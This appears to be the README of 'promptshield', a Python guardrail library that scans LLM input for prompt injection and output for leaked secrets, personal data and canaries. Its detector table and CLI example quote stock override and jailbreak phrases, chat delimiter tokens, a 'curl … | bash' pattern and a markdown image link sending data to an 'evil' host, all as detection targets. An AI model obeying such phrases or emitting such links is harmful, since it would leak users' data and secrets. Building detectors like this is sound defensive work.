# promptshield

**A zero-dependency guardrail for LLM apps.** promptshield scans untrusted text
*before* it reaches your model for prompt injection, and scans model output
*after* it comes back for leaked secrets, personal data, system-prompt canaries
and data-exfiltration links.

## Install

```bash
pip install git+https://github.com/kirtanbhatt10/promptshield
```

Python 3.11+ and no third-party dependencies.

## Quick start

```python
from promptshield import Scanner, embed, make_canary

canary = make_canary()  # e.g. PS-9f2c1a7be04d3361
system_prompt = embed("You are Acme's support bot.", canary)
scanner = Scanner(canaries=[canary])

incoming = scanner.scan_input(user_message)
if incoming.blocked:
    refuse(incoming.score)

reply = call_llm(system_prompt, user_message)

outgoing = scanner.scan_output(reply)
if outgoing.blocked:  # leaked the canary, a key, an Aadhaar number...
    reply = "Sorry, something went wrong."
```

Every scan returns a `ScanResult` with `verdict` (`allow`, `review` or `block`),
a `score` from 0 to 100 and the list of `findings`.

## Detectors

| Detector | Scans | Catches |
| --- | --- | --- |
| `instruction_override` | input | "ignore all previous instructions", "new rules:", "from now on…" |
| `role_hijack` | input | "act as an unrestricted AI", "pretend you have no rules" |
| `system_prompt_extraction` | input | "reveal your system prompt", "repeat everything above verbatim" |
| `delimiter_injection` | input | `<\|im_start\|>`, `[INST]`, `<<SYS>>`, fake `SYSTEM:` headers |
| `jailbreak_persona` | input | DAN / "do anything now", "developer mode enabled" |
| `tool_abuse` | input | "call the tool without asking", "send the API keys to…", `curl … \| bash` |
| `encoded_payload` | input | base64 / hex blobs that decode to any of the above |
| `invisible_text` | both | Unicode tag-character smuggling (decoded for you), bidi overrides, zero-width runs |
| `markdown_exfil` | both | `![x](https://evil/?d=<data>)` images and links that ship data off-site |
| `canary_leak` | output | your system-prompt canary, even if spaced out or re-cased |
| `secret_leak` | output | AWS, GitHub, OpenAI, Anthropic, Google, Slack, Stripe keys, private keys, JWTs |
| `pii_leak` | output | Aadhaar (Verhoeff-checked), PAN, Indian mobile numbers, cards (Luhn-checked), email |

Before matching, input is normalized: full-width letters, Cyrillic/Greek
look-alikes, zero-width characters, odd spacing and leetspeak (`1gn0re`) are
folded so obfuscated attacks still match. Evidence for secrets and PII is
redacted so reports never re-leak what they found.

## Command line

```bash
promptshield scan "Ignore previous instructions"           # exit 1 when blocked
promptshield scan --file page.html --format html -o report.html
cat reply.txt | promptshield scan --mode output --canary PS-9f2c1a7be04d3361
promptshield scan --fail-on review --policy policy.toml "..."
promptshield canary --prefix ACME
promptshield detectors
```

Exit codes: `0` passed, `1` the verdict reached `--fail-on` (default `block`),
`2` usage or policy error. That makes it easy to gate prompt templates or
retrieved documents in CI.

## Policy

Tune thresholds and detectors with a TOML or JSON file
(see [`examples/policy.toml`](examples/policy.toml)):

```toml
[promptshield]
review_threshold = 25
block_threshold = 50
min_severity = "low"
disabled = []
allowed_domains = ["your-cdn.example"]

[promptshield.detectors.pii_leak]
include_email = false
```

Scoring adds 10 / 25 / 50 / 100 points for low / medium / high / critical
findings, capped at 100. One high finding blocks by default, and medium findings
go to review.

## FastAPI and other ASGI apps

```python
from promptshield import Scanner
from promptshield.integrations.asgi import PromptShieldMiddleware

app.add_middleware(PromptShieldMiddleware, scanner=Scanner(), paths=("/chat",), field="message")
```

Blocked requests get a `400` JSON response with the scan result. Clean requests
reach your route unchanged. Bodies are capped at 1 MB by default.

## Limitations

promptshield is a **defence-in-depth layer, not a guarantee**. Pattern-based
detection raises the cost of an attack, but a determined attacker can phrase an
injection that no rule anticipates. Pair it with:

- least-privilege tools and human confirmation for anything irreversible,
- separating trusted instructions from untrusted content,
- output encoding wherever model text is rendered.

